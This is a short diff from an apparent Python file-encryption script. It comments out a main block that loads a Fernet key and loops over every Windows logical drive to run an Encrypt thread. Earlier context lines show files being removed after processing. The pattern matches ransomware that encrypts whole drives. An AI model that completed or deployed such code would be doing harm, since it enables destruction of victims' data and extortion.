@@ -56,14 +56,14 @@ class Decrypt(threading.Thread):
                     os.remove(filepath)
 
 
-if __name__ == "__main__":
-    key = open("key.txt", 'rb').read()
-    fernet = Fernet(key)
-    drives = win32api.GetLogicalDriveStrings()
-    drives = drives.split('\000')[:-1]
-    for drive in drives:
-        pass
-        # Encrypt(drive).run()
+#if __name__ == "__main__":
+#    key = open("key.txt", 'rb').read()
+#    fernet = Fernet(key)
+#    drives = win32api.GetLogicalDriveStrings()
+#    drives = drives.split('\000')[:-1]
+#    for drive in drives:
+#        pass
+#        # Encrypt(drive).run()
 # encrypt = Encrypt(r"C:\Users\shaoo\Desktop\lidan")
 # encrypt.run()
 # dec = Decrypt(r"C:\Users\shaoo\Desktop\lidan")
